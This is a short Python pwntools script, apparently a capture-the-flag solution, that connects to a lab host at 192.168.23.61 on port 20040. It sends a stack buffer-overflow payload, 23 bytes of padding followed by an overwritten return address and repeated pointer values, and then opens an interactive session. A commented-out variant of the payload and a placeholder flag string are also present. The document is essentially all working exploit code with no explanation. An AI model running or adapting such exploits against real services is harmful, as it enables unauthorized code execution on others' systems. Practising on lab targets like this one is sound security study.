from pwn import *
io = remote("192.168.23.61", 20040)

# payload=fit({
#     23: 0x08049443,
#     27: 0000,
#     31: 0x0804a020,
# })

payload = b"12345678901234567890123"
payload += b"\x43\x94\x04\x08"
payload += b'\x21\xa0\x04\x08'
payload += b'\x21\xa0\x04\x08'
payload += b'\x21\xa0\x04\x08'
payload += b'\x21\xa0\x04\x08'
payload += b'\x21\xa0\x04\x08'


io.sendline(payload)
io.interactive()

#flag{i_forgot_the_flag}
